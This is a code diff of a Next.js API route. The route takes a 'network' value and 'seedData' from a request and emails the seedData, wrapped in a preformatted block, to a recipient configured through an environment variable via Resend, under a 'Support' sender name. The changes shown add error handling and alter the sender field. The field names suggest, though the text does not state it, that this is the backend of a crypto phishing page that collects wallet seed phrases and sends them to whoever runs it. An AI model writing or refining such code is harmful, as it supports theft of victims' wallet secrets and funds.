@@ -20,12 +20,10 @@ export async function POST(request: NextRequest) {
     // Check environment variables
     const resendApiKey = process.env.RESEND_API_KEY
     const recipient = process.env.EMAIL_RECIPIENT
-    const fromEmail = process.env.AUTH_EMAIL_USER
 
     console.log('Environment check:', { 
       hasApiKey: !!resendApiKey, 
-      hasRecipient: !!recipient, 
-      hasFromEmail: !!fromEmail 
+      hasRecipient: !!recipient
     })
 
     if (!resendApiKey) {
@@ -44,33 +42,37 @@ export async function POST(request: NextRequest) {
       )
     }
 
-    if (!fromEmail) {
-      console.error('AUTH_EMAIL_USER is not configured')
-      return NextResponse.json(
-        { error: 'Email service not configured: AUTH_EMAIL_USER missing' },
-        { status: 500 }
-      )
-    }
-
     // Initialize Resend
     const resend = new Resend(resendApiKey)
 
-    // Send email using Resend
+    // Send email using Resend with domain
     console.log('Attempting to send email via Resend...')
-    const result = await resend.emails.send({
-      from: fromEmail,
-      to: recipient,
+    const { data, error } = await resend.emails.send({
+      from: `Support ${process.env.AUTH_EMAIL_USER}`,
+      to: [recipient],
       subject: network,
       html: `<pre style="font-family: 'Courier New', monospace; font-size: 14px; white-space: pre-wrap; word-break: break-all;">${seedData}</pre>`,
     })
 
-    console.log('Resend email sent successfully:', result)
+    if (error) {
+      console.error('Resend API error:', error)
+      return NextResponse.json(
+        { 
+          error: 'Failed to send email via Resend', 
+          details: error.message || 'Unknown Resend error'
+        },
+        { status: 500 }
+      )
+    }
+
+    console.log('Resend email sent successfully:', data)
 
     return NextResponse.json(
-      { success: true, message: 'Email sent successfully', data: result },
+      { success: true, message: 'Email sent successfully', data: data },
       { status: 200 }
     )
 
+  // eslint-disable-next-line @typescript-eslint/no-explicit-any
   } catch (error: any) {
     console.error('Email sending error:', error)
     console.error('Error details:', {
